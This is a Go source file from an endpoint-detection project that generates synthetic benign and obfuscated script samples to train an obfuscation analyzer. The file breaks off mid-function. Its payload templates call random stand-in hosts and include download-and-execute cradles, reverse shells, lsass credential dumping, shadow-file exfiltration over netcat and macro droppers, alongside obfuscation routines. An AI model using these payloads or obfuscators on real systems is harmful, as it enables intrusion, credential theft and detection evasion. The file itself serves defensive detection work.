// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

// Synthetic corpus generator for the obfuscation-stats analyzer. Everything
// here is deterministic given a seed: benign script/command-line templates
// written for this repo, and our own obfuscators (NOT the published
// Invoke-Obfuscation / DOSfuscation tools). The same generators are used for
// calibration and for evaluation (with different seeds), so reported accuracy
// is optimistic; see docs/research-obfuscation.md.

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"regexp"
	"sort"
	"strings"
	"unicode/utf16"
)

type obfSample struct {
	Lang  string
	Kind  string // script | cmdline
	Text  string
	Obf   bool
	Techs []string
	Cat   string // benign category or obfuscation source
}

type obfGen struct{ r *rand.Rand }

func newObfGen(seed int64) *obfGen { return &obfGen{rand.New(rand.NewSource(seed))} }

func (g *obfGen) pick(xs ...string) string { return xs[g.r.Intn(len(xs))] }
func (g *obfGen) n(lo, hi int) int         { return lo + g.r.Intn(hi-lo+1) }
func (g *obfGen) chance(p float64) bool    { return g.r.Float64() < p }

var obfWords = strings.Fields(`report backup archive config settings service worker deploy release build cache session
user account inventory invoice order customer payment ledger audit monitor metrics status health update cleanup
export import sync mirror queue batch schedule notify email template render parser loader handler manager client
server gateway proxy router store index search filter result summary totals daily weekly monthly nightly staging
production sandbox primary replica secondary logs events alerts tickets reports reviews builds images packages`)

func (g *obfGen) word() string { return obfWords[g.r.Intn(len(obfWords))] }
func (g *obfGen) camel() string {
	a, b := g.word(), g.word()
	return a + strings.ToUpper(b[:1]) + b[1:]
}
func (g *obfGen) pascal() string {
	a, b := g.word(), g.word()
	return strings.ToUpper(a[:1]) + a[1:] + strings.ToUpper(b[:1]) + b[1:]
}
func (g *obfGen) snake() string { return g.word() + "_" + g.word() }
func (g *obfGen) host() string {
	return g.pick("example.com", "corp.example.org", "intranet.local", "api.example.net", "files.example.com")
}
func (g *obfGen) evilHost() string {
	const al = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, g.n(6, 12))
	for i := range b {
		b[i] = al[g.r.Intn(len(al))]
	}
	return string(b) + "." + g.pick("xyz", "top", "ru", "cc", "info")
}
func (g *obfGen) winPath() string {
	return g.pick(`C:\Logs`, `C:\Data`, `D:\Backups`, `C:\Program Files\App`, `C:\Temp\`+g.word(), `E:\Share\`+g.word())
}
func (g *obfGen) unixPath() string {
	return g.pick("/var/log", "/opt/"+g.word(), "/srv/"+g.word(), "/etc/"+g.word(), "/home/deploy/"+g.word(), "/tmp/"+g.word())
}
func (g *obfGen) version() string { return fmt.Sprintf("%d.%d.%d", g.n(1, 9), g.n(0, 20), g.n(0, 99)) }

// ---- benign templates ------------------------------------------------------

type obfTpl struct {
	cat     string
	oneLine bool
	f       func(g *obfGen) string
}

var obfBenignPS = []obfTpl{
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("Get-ChildItem -Path %s -Filter *.%s -Recurse | Where-Object { $_.Length -gt %dMB } | Sort-Object Length -Descending | Select-Object -First %d FullName, Length", g.winPath(), g.pick("log", "bak", "tmp", "csv"), g.n(1, 500), g.n(5, 50))
	}},
	{"admin", false, func(g *obfGen) string {
		v := g.camel()
		return fmt.Sprintf("$%s = Get-Service | Where-Object { $_.Status -eq 'Running' -and $_.Name -like '%s*' }\nforeach ($svc in $%s) {\n    Write-Host (\"{0} is {1}\" -f $svc.Name, $svc.Status)\n}", v, g.word(), v)
	}},
	{"build", false, func(g *obfGen) string {
		return fmt.Sprintf("function Invoke-%s {\n    param([string]$Configuration = 'Release', [switch]$Clean)\n    if ($Clean) { Remove-Item -Recurse -Force .\\%s -ErrorAction SilentlyContinue }\n    dotnet build -c $Configuration --nologo\n    if ($LASTEXITCODE -ne 0) { throw \"build failed with exit code $LASTEXITCODE\" }\n}", g.pascal(), g.pick("bin", "obj", "dist"))
	}},
	{"config", false, func(g *obfGen) string {
		return fmt.Sprintf("$config = Get-Content -Raw -Path .\\%s.json | ConvertFrom-Json\n$config.%s.timeout = %d\n$config | ConvertTo-Json -Depth 5 | Set-Content -Path .\\%s.json", g.word(), g.word(), g.n(5, 300), g.word())
	}},
	{"net", false, func(g *obfGen) string {
		return fmt.Sprintf("try {\n    $resp = Invoke-RestMethod -Uri \"https://%s/v%d/%s\" -Method Get -Headers @{ Authorization = \"Bearer $env:API_TOKEN\" }\n    Write-Output \"$($resp.count) items\"\n} catch {\n    Write-Warning \"request failed: $($_.Exception.Message)\"\n}", g.host(), g.n(1, 3), g.word())
	}},
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("Get-WinEvent -FilterHashtable @{ LogName = 'Application'; Level = 2; StartTime = (Get-Date).AddHours(-%d) } | Select-Object TimeCreated, ProviderName, Message | Export-Csv -NoTypeInformation -Path %s\\errors.csv", g.n(1, 72), g.winPath())
	}},
	{"installer", false, func(g *obfGen) string {
		return fmt.Sprintf("$pkgs = @(%s)\nforeach ($p in $pkgs) {\n    Write-Host (\"Installing {0} ({1}/{2})\" -f $p, ($pkgs.IndexOf($p) + 1), $pkgs.Count)\n    winget install --id $p --silent --accept-package-agreements\n}", `"Git.Git", "Microsoft.VisualStudioCode", "7zip.7zip"`)
	}},
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("Get-Process | Where-Object { $_.CPU -gt %d } | Sort-Object CPU -Descending | Select-Object -First %d Name, Id, CPU, WorkingSet | Format-Table -AutoSize", g.n(5, 300), g.n(3, 20))
	}},
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("$names = Get-ADGroupMember -Identity '%s' | Select-Object -ExpandProperty SamAccountName\nWrite-Output ($names -join ', ')\n$names.Count", strings.ToUpper(g.word()))
	}},
	{"config", false, func(g *obfGen) string {
		return fmt.Sprintf("New-ItemProperty -Path 'HKLM:\\SOFTWARE\\%s\\%s' -Name '%s' -Value %d -PropertyType DWord -Force | Out-Null", g.pascal(), g.pascal(), g.pascal(), g.n(0, 1000))
	}},
	{"cmdline", true, func(g *obfGen) string {
		return fmt.Sprintf("powershell.exe -NoProfile -ExecutionPolicy Bypass -File %s\\%s.ps1 -Environment %s", g.winPath(), g.pascal(), g.pick("Staging", "Production"))
	}},
	{"cmdline", true, func(g *obfGen) string {
		return fmt.Sprintf("powershell -NoProfile -Command \"Get-Service %s | Restart-Service -Force; Get-Date -Format s\"", g.pascal())
	}},
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("Register-ScheduledTask -TaskName '%s' -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File %s\\%s.ps1') -Trigger (New-ScheduledTaskTrigger -Daily -At %d:00am)", g.pascal(), g.winPath(), g.camel(), g.n(1, 9))
	}},
	{"pipeline", false, func(g *obfGen) string {
		return fmt.Sprintf("Get-ChildItem %s -Recurse -File | Group-Object Extension | Sort-Object Count -Descending | Select-Object -First %d @{n='Ext';e={$_.Name}}, Count, @{n='SizeMB';e={[math]::Round(($_.Group | Measure-Object Length -Sum).Sum / 1MB, 1)}} | Format-Table -AutoSize", g.winPath(), g.n(5, 20))
	}},
}

var obfBenignCmd = []obfTpl{
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("@echo off\nset DEST=%s\\%%date:~-4%%\nif not exist \"%%DEST%%\" mkdir \"%%DEST%%\"\nxcopy /E /I /Y \"%s\" \"%%DEST%%\" >nul\necho Copied to %%DEST%%", g.winPath(), g.winPath())
	}},
	{"build", false, func(g *obfGen) string {
		return fmt.Sprintf("@echo off\nsetlocal\ncall \"C:\\Program Files\\Microsoft Visual Studio\\vcvars64.bat\"\nmsbuild %s.sln /p:Configuration=Release /m /verbosity:minimal\nif errorlevel 1 exit /b 1\nrobocopy bin\\Release %s /MIR /NFL /NDL", g.pascal(), g.winPath())
	}},
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("net stop %s\ntimeout /t %d /nobreak >nul\nnet start %s\nsc query %s | find \"RUNNING\"", g.pascal(), g.n(2, 30), g.pascal(), g.pascal())
	}},
	{"cmdline", true, func(g *obfGen) string {
		return fmt.Sprintf("cmd.exe /c \"dir %s /s /b | findstr /i \\.%s$ > %%TEMP%%\\%s.txt\"", g.winPath(), g.pick("log", "bak", "tmp"), g.word())
	}},
	{"installer", false, func(g *obfGen) string {
		return fmt.Sprintf("@echo off\nmsiexec /i \"%s\\%s-%s.msi\" /qn /norestart /l*v \"%%TEMP%%\\%s-install.log\" INSTALLDIR=\"C:\\Program Files\\%s\"\nif %%errorlevel%% neq 0 echo install failed %%errorlevel%%", g.winPath(), g.word(), g.version(), g.word(), g.pascal())
	}},
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("for /f \"tokens=1,2 delims==\" %%%%a in (%s.ini) do (\n  if \"%%%%a\"==\"%s\" set %s=%%%%b\n)\necho %%%s%%", g.word(), g.word(), strings.ToUpper(g.word()), strings.ToUpper(g.word()))
	}},
	{"cmdline", true, func(g *obfGen) string {
		return fmt.Sprintf("schtasks /create /tn \"%s\" /tr \"%s\\%s.bat\" /sc daily /st %02d:%02d /ru SYSTEM", g.pascal(), g.winPath(), g.word(), g.n(0, 23), g.n(0, 59))
	}},
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\nwmic logicaldisk get name,size,freespace")
	}},
}

var obfBenignBash = []obfTpl{
	{"build", false, func(g *obfGen) string {
		return fmt.Sprintf("#!/bin/bash\nset -euo pipefail\nVERSION=%s\nmake clean && make -j\"$(nproc)\" PREFIX=%s\ntar -czf %s-$VERSION.tar.gz -C build .\necho \"built %s $VERSION\"", g.version(), g.unixPath(), g.word(), g.word())
	}},
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("for f in %s/*.log; do\n  [ -s \"$f\" ] && gzip -9 \"$f\"\ndone\nfind %s -name '*.gz' -mtime +%d -delete", g.unixPath(), g.unixPath(), g.n(7, 90))
	}},
	{"installer", false, func(g *obfGen) string {
		return fmt.Sprintf("sudo apt-get update && sudo apt-get install -y %s %s %s\nsudo systemctl enable --now %s\nsudo ufw allow %d/tcp", g.pick("nginx", "postgresql", "redis-server"), g.pick("git", "curl", "jq"), g.pick("htop", "tmux", "unzip"), g.pick("nginx", "postgresql", "redis"), g.n(1024, 9999))
	}},
	{"cmdline", true, func(g *obfGen) string {
		return fmt.Sprintf("ps aux | grep %s | grep -v grep | awk '{print $2}' | xargs -r kill -HUP", g.word())
	}},
	{"pipeline", false, func(g *obfGen) string {
		return fmt.Sprintf("find %s -type f -name '*.%s' -print0 | xargs -0 du -h | sort -rh | head -%d | awk '{printf \"%%s\\t%%s\\n\", $1, $2}'", g.unixPath(), g.pick("log", "tmp", "bak"), g.n(5, 40))
	}},
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("docker ps --format '{{.Names}}' | while read name; do\n  docker logs --tail %d \"$name\" > \"%s/$name.log\" 2>&1\ndone", g.n(20, 500), g.unixPath())
	}},
	{"config", false, func(g *obfGen) string {
		return fmt.Sprintf("export %s_HOME=%s\nexport PATH=\"$%s_HOME/bin:$PATH\"\nif [ -f \"$%s_HOME/etc/%s.conf\" ]; then\n  source \"$%s_HOME/etc/%s.conf\"\nfi", strings.ToUpper(g.word()), g.unixPath(), "X", "X", g.word(), "X", g.word())
	}},
	{"cmdline", true, func(g *obfGen) string {
		return fmt.Sprintf("rsync -avz --delete --exclude='*.tmp' %s/ deploy@%s:%s/", g.unixPath(), g.host(), g.unixPath())
	}},
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("kubectl get pods -n %s -o json | jq -r '.items[] | select(.status.phase != \"Running\") | .metadata.name'", g.word())
	}},
}

var obfBenignJS = []obfTpl{
	{"app", false, func(g *obfGen) string {
		return fmt.Sprintf("const express = require('express');\nconst app = express();\napp.use(express.json());\napp.get('/%s/:id', async (req, res) => {\n  const %s = await db.find(req.params.id);\n  if (!%s) return res.status(404).json({ error: 'not found' });\n  res.json(%s);\n});\napp.listen(%d);", g.word(), g.camel(), "x", "x", g.n(3000, 9000))
	}},
	{"app", false, func(g *obfGen) string {
		v := g.camel()
		return fmt.Sprintf("function %s(items, limit) {\n  const result = [];\n  for (let i = 0; i < items.length && result.length < limit; i++) {\n    if (items[i].%s) result.push(items[i].%s);\n  }\n  return result;\n}\nmodule.exports = { %s };", v, g.word(), g.word(), v)
	}},
	{"app", false, func(g *obfGen) string {
		return fmt.Sprintf("async function load%s() {\n  const response = await fetch('/api/%s?limit=%d');\n  if (!response.ok) throw new Error('request failed: ' + response.status);\n  const data = await response.json();\n  return data.items.map(item => item.%s);\n}", g.pascal(), g.word(), g.n(10, 100), g.word())
	}},
	{"app", false, func(g *obfGen) string {
		return fmt.Sprintf("document.querySelectorAll('.%s').forEach(el => {\n  el.addEventListener('click', event => {\n    event.preventDefault();\n    el.classList.toggle('%s');\n    console.log(`toggled ${el.dataset.id}`);\n  });\n});", g.word(), g.word())
	}},
	{"build", false, func(g *obfGen) string {
		return fmt.Sprintf("const path = require('path');\nmodule.exports = {\n  entry: './src/%s.js',\n  output: { path: path.resolve(__dirname, 'dist'), filename: '[name].[contenthash].js' },\n  module: { rules: [{ test: /\\.jsx?$/, exclude: /node_modules/, use: 'babel-loader' }] },\n  mode: '%s',\n};", g.word(), g.pick("production", "development"))
	}},
	{"app", true, func(g *obfGen) string {
		return fmt.Sprintf("const %s = (a, b) => a.reduce((sum, x) => sum + x.%s * b, 0); console.log(%s(items, %d));", g.camel(), g.word(), "total", g.n(1, 9))
	}},
	{"app", false, func(g *obfGen) string {
		return fmt.Sprintf("class %s {\n  constructor(limit) { this.limit = limit; this.store = new Map(); }\n  get(key) { return this.store.get(key); }\n  set(key, value) {\n    if (this.store.size >= this.limit) this.store.delete(this.store.keys().next().value);\n    this.store.set(key, value);\n  }\n}", g.pascal())
	}},
}

var obfBenignPy = []obfTpl{
	{"app", false, func(g *obfGen) string {
		return fmt.Sprintf("import argparse\nimport os\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"%s tool\")\n    parser.add_argument(\"--%s\", default=\"%s\")\n    args = parser.parse_args()\n    for name in sorted(os.listdir(args.%s)):\n        print(name)\n\nif __name__ == \"__main__\":\n    main()", g.word(), g.word(), g.unixPath(), "x")
	}},
	{"app", false, func(g *obfGen) string {
		return fmt.Sprintf("import requests\n\ndef fetch_%s(session, page=1):\n    response = session.get(\"https://%s/api/%s\", params={\"page\": page}, timeout=10)\n    response.raise_for_status()\n    return response.json()[\"items\"]\n", g.snake(), g.host(), g.word())
	}},
	{"app", false, func(g *obfGen) string {
		return fmt.Sprintf("class %s:\n    def __init__(self):\n        self.items = {}\n\n    def add(self, name, quantity=1):\n        self.items[name] = self.items.get(name, 0) + quantity\n\n    def total(self):\n        return sum(self.items.values())", g.pascal())
	}},
	{"admin", false, func(g *obfGen) string {
		return fmt.Sprintf("import subprocess\nresult = subprocess.run([\"git\", \"-C\", \"%s\", \"log\", \"--oneline\", \"-n\", \"%d\"], capture_output=True, text=True, check=True)\nfor line in result.stdout.splitlines():\n    print(line)", g.unixPath(), g.n(3, 30))
	}},
	{"app", false, func(g *obfGen) string {
		return fmt.Sprintf("import csv\nwith open(\"%s.csv\", newline=\"\") as handle:\n    rows = list(csv.DictReader(handle))\ntotals = {}\nfor row in rows:\n    totals[row[\"%s\"]] = totals.get(row[\"%s\"], 0) + float(row[\"%s\"])\nprint(sorted(totals.items(), key=lambda kv: kv[1], reverse=True)[:%d])", g.word(), g.word(), g.word(), g.word(), g.n(3, 10))
	}},
	{"build", false, func(g *obfGen) string {
		return fmt.Sprintf("from setuptools import setup, find_packages\nsetup(\n    name=\"%s\",\n    version=\"%s\",\n    packages=find_packages(),\n    install_requires=[\"requests>=2.28\", \"click>=8.0\"],\n    entry_points={\"console_scripts\": [\"%s=%s.cli:main\"]},\n)", g.word(), g.version(), g.word(), g.word())
	}},
}

var obfBenignVBA = []obfTpl{
	{"office", false, func(g *obfGen) string {
		return fmt.Sprintf("Sub Format%s()\n    Dim ws As Worksheet\n    Set ws = ThisWorkbook.Worksheets(\"%s\")\n    ws.Range(\"A1:%s1\").Font.Bold = True\n    ws.Columns(\"A:%s\").AutoFit\n    MsgBox \"Formatted \" & ws.Name, vbInformation\nEnd Sub", g.pascal(), g.pascal(), g.pick("D", "F", "H"), g.pick("D", "F", "H"))
	}},
	{"office", false, func(g *obfGen) string {
		return fmt.Sprintf("Function Total%s(rng As Range) As Double\n    Dim cell As Range\n    Dim acc As Double\n    For Each cell In rng\n        If IsNumeric(cell.Value) Then acc = acc + cell.Value\n    Next cell\n    Total%s = acc\nEnd Function", g.pascal(), g.pascal())
	}},
	{"office", false, func(g *obfGen) string {
		return fmt.Sprintf("Sub Export%s()\n    Dim fileName As String\n    fileName = ThisWorkbook.Path & \"\\%s_\" & Format(Date, \"yyyymmdd\") & \".csv\"\n    ActiveSheet.SaveAs fileName:=fileName, FileFormat:=xlCSV\nEnd Sub", g.pascal(), g.word())
	}},
	{"office", false, func(g *obfGen) string {
		return fmt.Sprintf("Sub Mail%s()\n    Dim app As Object\n    Set app = CreateObject(\"Outlook.Application\")\n    With app.CreateItem(0)\n        .To = \"%s@%s\"\n        .Subject = \"%s \" & Format(Date, \"dd mmm\")\n        .Body = \"Line one\" & vbCrLf & \"Line two\"\n        .Display\n    End With\nEnd Sub", g.pascal(), g.word(), g.host(), g.word())
	}},
	{"office", false, func(g *obfGen) string {
		return fmt.Sprintf("Private Sub Workbook_Open()\n    Dim lastRow As Long\n    lastRow = Cells(Rows.Count, 1).End(xlUp).Row\n    Range(\"A2:A\" & lastRow).Sort Key1:=Range(\"A2\"), Order1:=xlAscending, Header:=xlNo\n    Range(\"B\" & lastRow + 1).Formula = \"=SUM(B2:B\" & lastRow & \")\"\nEnd Sub")
	}},
}

var obfBenignByLang = map[string][]obfTpl{
	obfLangPS: obfBenignPS, obfLangCmd: obfBenignCmd, obfLangBash: obfBenignBash,
	obfLangJS: obfBenignJS, obfLangPy: obfBenignPy, obfLangVBA: obfBenignVBA,
}

func (g *obfGen) benignSource(lang string) (string, bool) {
	tpls := obfBenignByLang[lang]
	t := tpls[g.r.Intn(len(tpls))]
	if t.oneLine {
		return t.f(g), true
	}
	n := 1
	if g.chance(0.4) {
		n = g.n(2, 4) // multi-part scripts and long pipelines
	}
	parts := []string{t.f(g)}
	for i := 1; i < n; i++ {
		parts = append(parts, tpls[g.r.Intn(len(tpls))].f(g))
	}
	return strings.Join(parts, "\n"), false
}

// ---- payload sources for obfuscated samples --------------------------------

func (g *obfGen) payloadSource(lang string) string {
	h := g.evilHost()
	switch lang {
	case obfLangPS:
		return g.pick(
			fmt.Sprintf("IEX (New-Object Net.WebClient).DownloadString('http://%s/p.ps1')", h),
			fmt.Sprintf("$url = 'http://%s/a.exe'\n$out = $env:TEMP + '\\update.exe'\nInvoke-WebRequest -Uri $url -OutFile $out\nStart-Process $out", h),
			fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',4444)\n$stream = $client.GetStream()\n$buffer = New-Object byte[] 1024\nwhile (($read = $stream.Read($buffer, 0, 1024)) -ne 0) { $data = [Text.Encoding]::ASCII.GetString($buffer, 0, $read); $stream.Write($buffer, 0, $read) }", h),
			"$proc = Get-Process -Name lsass\n$dump = $env:TEMP + '\\lsass.dmp'\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $proc.Id $dump full",
		)
	case obfLangCmd:
		return g.pick(
			fmt.Sprintf("cmd /c certutil -urlcache -f http://%s/a.exe %%TEMP%%\\a.exe && %%TEMP%%\\a.exe", h),
			fmt.Sprintf("powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://%s/x')\"", h),
			"whoami /all & net user & net localgroup administrators & ipconfig /all",
			fmt.Sprintf("schtasks /create /tn Updater /tr \"mshta http://%s/a.hta\" /sc minute /mo 5 /f", h),
		)
	case obfLangBash:
		return g.pick(
			fmt.Sprintf("curl -s http://%s/x.sh | bash", h),
			fmt.Sprintf("bash -i >& /dev/tcp/%s/4444 0>&1", h),
			fmt.Sprintf("wget -qO- http://%s/a | sh && history -c", h),
			fmt.Sprintf("cat /etc/passwd /etc/shadow | nc %s 4444", h),
		)
	case obfLangJS:
		return g.pick(
			fmt.Sprintf("var shell = new ActiveXObject('WScript.Shell');\nshell.Run('cmd /c certutil -urlcache -f http://%s/a.exe %%TEMP%%\\\\a.exe && %%TEMP%%\\\\a.exe', 0, false);", h),
			fmt.Sprintf("fetch('http://%s/x').then(function(r){return r.text()}).then(function(t){eval(t)});", h),
			fmt.Sprintf("var s = document.createElement('script');\ns.src = 'http://%s/inject.js';\ndocument.body.appendChild(s);", h),
		)
	case obfLangPy:
		return g.pick(
			fmt.Sprintf("import os, socket, subprocess\ns = socket.socket()\ns.connect(('%s', 4444))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nsubprocess.call(['/bin/sh', '-i'])", h),
			fmt.Sprintf("import urllib.request\nexec(urllib.request.urlopen('http://%s/x.py').read())", h),
			fmt.Sprintf("import subprocess\nsubprocess.Popen('curl -s http://%s/a | sh', shell=True)", h),
		)
	default:
		return g.pick(
			fmt.Sprintf("Sub AutoOpen()\n    Dim sh As Object\n    Set sh = CreateObject(\"WScript.Shell\")\n    sh.Run \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://%s/x')\", 0\nEnd Sub", h),
			fmt.Sprintf("Sub Document_Open()\n    Dim http As Object\n    Set http = CreateObject(\"MSXML2.XMLHTTP\")\n    http.Open \"GET\", \"http://%s/p.bin\", False\n    http.Send\n    Dim stream As Object\n    Set stream = CreateObject(\"ADODB.Stream\")\nEnd Sub", h),
		)
	}
}

// ---- obfuscation techniques ------------------------------------------------

var obfTechByLang = map[string][]string{
	obfLangPS:   {"randcase", "tick", "split", "format", "charcode", "encoding", "rename", "reverse"},
	obfLangCmd:  {"randcase", "caret", "quote", "envsub", "encoding", "rename"},
	obfLangBash: {"quote", "hexesc", "encoding", "rename", "ifs", "reverse"},
	obfLangJS:   {"split", "charcode", "hexesc", "encoding", "rename", "reverse"},
	obfLangPy:   {"split", "charcode", "hexesc", "encoding", "rename", "reverse"},
	obfLangVBA:  {"randcase", "split", "charcode", "encoding", "rename"},
}

var obfAllTechs = func() []string {
	m := map[string]bool{}
	for _, ts := range obfTechByLang {
		for _, t := range ts {
			m[t] = true
		}
	}
	var out []string
	for t := range m {
		out = append(out, t)
	}
	sort.Strings(out)
	return out
}()

var obfLitRe = map[string]*regexp.Regexp{
	obfLangPS:   regexp.MustCompile(`'([^'\n]{4,40})'`),
	obfLangCmd:  regexp.MustCompile(`\b([A-Za-z]{5,14})\b`),
	obfLangBash: regexp.MustCompile(`\b([a-z]{4,12})\b`),
	obfLangJS:   regexp.MustCompile(`'([^'\n]{4,40})'`),
	obfLangPy:   regexp.MustCompile(`'([^'\n]{4,40})'`),
	obfLangVBA:  regexp.MustCompile(`"([^"\n]{4,40})"`),
}

func (g *obfGen) randIdent() string {
	switch g.n(0, 3) {
	case 0:
		return fmt.Sprintf("_0x%x", g.n(0x1000, 0xfffff))
	case 1:
		const al = "bcdfghjklmnpqrstvwxzBCDFGHJKLMNPQRSTVWXZ"
		b := make([]byte, g.n(6, 14))
		for i := range b {
			b[i] = al[g.r.Intn(len(al))]
		}
		return string(b)
	case 2:
		const al = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		b := make([]byte, g.n(7, 16))
		b[0] = al[g.r.Intn(52)]
		for i := 1; i < len(b); i++ {
			b[i] = al[g.r.Intn(len(al))]
		}
		return string(b)
	default:
		return strings.Repeat("l", g.n(1, 3)) + strings.Repeat("I", g.n(1, 3)) + fmt.Sprint(g.n(10, 9999)) + "x"
	}
}

func (g *obfGen) randCase(s string) string {
	b := []byte(s)
	for i, c := range b {
		if (c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z') && g.chance(0.5) {
			b[i] = c ^ 0x20
		}
	}
	return string(b)
}

// mapWords applies f to some alphabetic words (length>=4) outside nothing in particular.
func (g *obfGen) mapWords(s string, p float64, f func(w string) string) string {
	re := regexp.MustCompile(`[A-Za-z]{4,}`)
	return re.ReplaceAllStringFunc(s, func(w string) string {
		if g.chance(p) {
			return f(w)
		}
		return w
	})
}

func (g *obfGen) splitLit(lit string) []string {
	var parts []string
	for len(lit) > 0 {
		k := g.n(1, 3)
		if k > len(lit) {
			k = len(lit)
		}
		parts = append(parts, lit[:k])
		lit = lit[k:]
	}
	return parts
}

func obfB64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }
func obfB64UTF16(s string) string {
	var out []byte
	for _, u := range utf16.Encode([]rune(s)) {
		out = append(out, byte(u), byte(u>>8))
	}
	return base64.StdEncoding.EncodeToString(out)
}

func (g *obfGen) applyTech(lang, tech, src string) string {
	lit := obfLitRe[lang]
	switch tech {
	case "randcase":
		return g.randCase(src)
	case "tick":
		return g.mapWords(src, 0.7, func(w string) string {
			var sb strings.Builder
			for i, c := range w {
				if i > 0 && g.chance(0.35) && !strings.ContainsRune("abfnrtv0", c) {
					sb.WriteByte('`')
				}
				sb.WriteRune(c)
			}
			return sb.String()
		})
	case "caret":
		return g.mapWords(src, 0.8, func(w string) string {
			var sb strings.Builder
			for i, c := range w {
				if i > 0 && g.chance(0.3) {
					sb.WriteByte('^')
					if g.chance(0.2) {
						sb.WriteByte('^')
					}
				}
				sb.WriteRune(c)
			}
			return sb.String()
		})
	case "quote":
		q := g.pick(`""`, `''`)
		if lang == obfLangCmd {
			q = `""`
		}
		return g.mapWords(src, 0.8, func(w string) string {
			var sb strings.Builder
			for i, c := range w {
				if i > 0 && g.chance(0.25) {
					sb.WriteString(q)
				}
				sb.WriteRune(c)
			}
			return sb.String()
		})
	case "split":
		op := "+"
		if lang == obfLangVBA {
			op = "&"
		}
		return lit.ReplaceAllStringFunc(src, func(m string) string {
			if lang == obfLangCmd || lang == obfLangBash {
				return m
			}
			qc := m[:1]
			inner := m[1 : len(m)-1]
			ps := g.splitLit(inner)
			return "(" + qc + strings.Join(ps, qc+" "+op+" "+qc) + qc + ")"
		})
	case "format":
		return lit.ReplaceAllStringFunc(src, func(m string) string {
			inner := m[1 : len(m)-1]
			ps := g.splitLit(inner)
			if len(ps) < 2 || strings.ContainsAny(inner, "{}") {
				return m
			}
			fmtStr := ""
			slot := g.r.Perm(len(ps))
			final := make([]string, len(ps))
			for i := range ps {
				final[slot[i]] = ps[i]
			}
			for i := range ps {
				fmtStr += fmt.Sprintf("{%d}", slot[i])
			}
			return "('" + fmtStr + "' -f '" + strings.Join(final, "','") + "')"
		})
	case "charcode":
		return lit.ReplaceAllStringFunc(src, func(m string) string {
			if lang == obfLangCmd {
				return m
			}
			inner := m
			if lang != obfLangBash {
				inner = m[1 : len(m)-1]
			}
			if len(inner) < 3 {
				return m
			}
			switch lang {
			case obfLangPS:
				var ps []string
				for _, c := range []byte(inner) {
					ps = append(ps, fmt.Sprintf("[char]%d", c))
				}
				if g.chance(0.5) {
					return "(" + strings.Join(ps, "+") + ")"
				}
				var nums []string
				for _, c := range []byte(inner) {
					nums = append(nums, fmt.Sprint(c))
				}
				return "(-join([char[]](" + strings.Join(nums, ",") + ")))"
			case obfLangJS:
				var nums []string
				for _, c := range []byte(inner) {
					nums = append(nums, fmt.Sprint(c))
				}
				return "String.fromCharCode(" + strings.Join(nums, ",") + ")"
			case obfLangPy:
				var nums []string
				for _, c := range []byte(inner) {
					nums = append(nums, fmt.Sprint(c))
				}
				return "''.join(chr(c) for c in [" + strings.Join(nums, ",") + "])"
			case obfLangVBA:
				var ps []string
				for _, c := range []byte(inner) {
					ps = append(ps, fmt.Sprintf("Chr(%d)", c))
				}
				return strings.Join(ps, " & ")
			default: // bash: ANSI-C octal
				var sb strings.Builder
				sb.WriteString("$'")
				for _, c := range []byte(inner) {
					fmt.Fprintf(&sb, "\\%03o", c)
				}
				sb.WriteString("'")
				return sb.String()
			}
		})
	case "hexesc":
		hexify := func(inner string) string {
			var sb strings.Builder
			for _, c := range []byte(inner) {
				if g.chance(0.8) {
					fmt.Fprintf(&sb, "\\x%02x", c)
				} else {
					sb.WriteByte(c)
				}
			}
			return sb.String()
		}
		if lang == obfLangBash {
			return lit.ReplaceAllStringFunc(src, func(m string) string {
				if g.chance(0.5) {
					return m
				}
				return "$'" + hexify(m) + "'"
			})
		}
		return lit.ReplaceAllStringFunc(src, func(m string) string {
			return m[:1] + hexify(m[1:len(m)-1]) + m[len(m)-1:]
		})
	case "reverse":
		rev := func(s string) string {
			b := []byte(s)
			for i, j := 0, len(b)-1; i < j; i, j = i+1, j-1 {
				b[i], b[j] = b[j], b[i]
			}
			return string(b)
		}
		return lit.ReplaceAllStringFunc(src, func(m string) string {
			if lang == obfLangBash {
				if len(m) < 5 || !g.chance(0.5) {
					return m
				}
				return "$(echo " + rev(m) + "|rev)"
			}
			inner := m[1 : len(m)-1]
			if strings.ContainsAny(inner, "{}\\") {
				return m
			}
			switch lang {
			case obfLangPS:
				return fmt.Sprintf("(-join'%s'[%d..0])", rev(inner), len(inner)-1)
			case obfLangJS:
				return fmt.Sprintf("'%s'.split('').reverse().join('')", rev(inner))
			default:
				return fmt.Sprintf("'%s'[::-1]", rev(inner))
			}
		})
	case "ifs":
		return strings.ReplaceAll(src, " ", "${IFS}")
	case "envsub":
		letters := map[rune]bool{}
		for _, c := range src {
			if c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' {
				letters[c] = true
			}
		}
		var al []rune
		for c := range letters {
			al = append(al, c)
		}
		sort.Slice(al, func(i, j int) bool { return al[i] < al[j] })
